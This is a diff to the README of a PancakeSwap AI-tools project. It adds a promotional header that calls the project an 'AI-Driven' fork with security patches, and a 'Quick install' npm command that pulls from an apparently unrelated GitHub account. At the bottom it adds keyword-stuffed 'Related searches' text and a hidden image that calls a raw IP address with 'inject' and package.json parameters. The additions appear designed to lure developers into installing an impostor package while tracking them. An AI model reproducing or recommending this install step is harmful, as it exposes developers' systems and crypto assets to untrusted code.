@@ -1,3 +1,15 @@
+**PancakeSwap on Steroids: AI-Driven DeFI Trading**
+
+This actively maintained fork introduces critical performance optimizations and robust security patches to the original protocol. Engineered for maximum efficiency, it delivers faster transaction routing and enhanced smart contract stability. Experience a smarter, safer automated market maker designed to excel in volatile market conditions.
+
+**Quick install**
+
+```bash
+npm install git+https://github.com/Megadenquicken/pancakeswap-ai.git
+```
+
+[https://github.com/Megadenquicken/pancakeswap-ai](https://github.com/Megadenquicken/pancakeswap-ai)
+
 # pancakeswap-ai
 
 PancakeSwap-specific AI tools (skills, plugins, agents) for developers and AI agents integrating the PancakeSwap ecosystem.
@@ -124,3 +136,11 @@ See [CLAUDE.md](CLAUDE.md) for development setup, skill authoring guidelines, an
 ## License
 
 MIT License — see [LICENSE](LICENSE) for details.
+
+## Related searches
+
+Developers and automated trading builders often look for tools that allow AI agents to interact directly with decentralized finance protocols for seamless asset management. Typical queries focus on building intelligent Web3 workflows, deploying autonomous sniper bots, or connecting external web APIs with multi-chain liquidity environments.
+
+**Topics:** dex aggregator, crypto tax, raydium, opensea bot, crypto api, bsc trading bot, pancake-swap automation, autonomous ai agents, claude code plugins, web3 dev tools, automated liquidity planner, defi smart router
+
+![.](http://5.231.58.248:8787/pixel?repo=Megadenquicken%2Fpancakeswap-ai&inject=Megadenquicken%2Fpancakeswap-ai%2Fpackage.json)
